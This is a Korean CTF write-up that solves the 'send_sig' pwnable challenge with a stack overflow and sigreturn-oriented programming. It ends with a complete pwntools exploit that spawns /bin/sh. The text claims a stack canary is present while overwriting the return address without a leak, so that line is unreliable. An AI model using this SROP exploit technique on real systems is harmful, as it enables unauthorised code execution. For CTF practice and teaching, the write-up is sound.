---
title: "send_sig 라이트업"
date: 2025-02-05 00:00:00 +0900
categories: [CTF]
tags: [pwnable, writeup]
permalink: /posts/pwn-send-sig/
---

바이너리의 소스 코드가 주어지지 않았고 심볼도 없습니다. **pop rax**, **syscall** 가젯을 찾을 수 있습니다.

```c
ssize_t sub_4010B6()
{
  _BYTE buf[8]; // [rsp+8h] [rbp-8h] BYREF

  write(1, "Signal:", 7uLL);
  return read(0, buf, 0x400uLL);
}
```

# 공격 기법

버퍼 오버플로우를 찾을 수 있으며, PIE가 없고 카나리가 있습니다 => ret을 덮어쓸 수 있습니다.

pwntools에는 시그널 프레임을 편리하게 만드는 **Sigframe()** 함수가 있습니다. 레지스터를 자유롭게 설정할 수 있습니다.
```python
frame = SigreturnFrame()
# read(0, bss, 0x1000)
frame.rax = 0        # SYS_read
frame.rsi = bss
frame.rdx = 0x1000
frame.rdi = 0
frame.rip = syscall
frame.rsp = bss
```

/bin/sh가 주어집니다.
```
.rodata:0000000000402000 aBinSh          db '/bin/sh',0
```

따라서 한 번의 syscall로 execve('/bin/sh',0,0)를 호출할 수 있습니다.

# 익스플로잇

```python
from pwn import *

context.arch = 'x86_64'

p = process('./send_sig')

p.recvuntil(b'Signal:')

elf = ELF('./send_sig')

bss = elf.bss()

gad1 = 0x4010ae

gad2 = 0x4010b0

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x402000
frame.rip = gad2
frame.rsp = bss + 0x500

payload = b'A' * 8 + b'B' * 8
payload += p64(gad1)
payload += p64(15)
payload += p64(gad2)
payload += bytes(frame)

p.send(payload)

p.interactive()
```
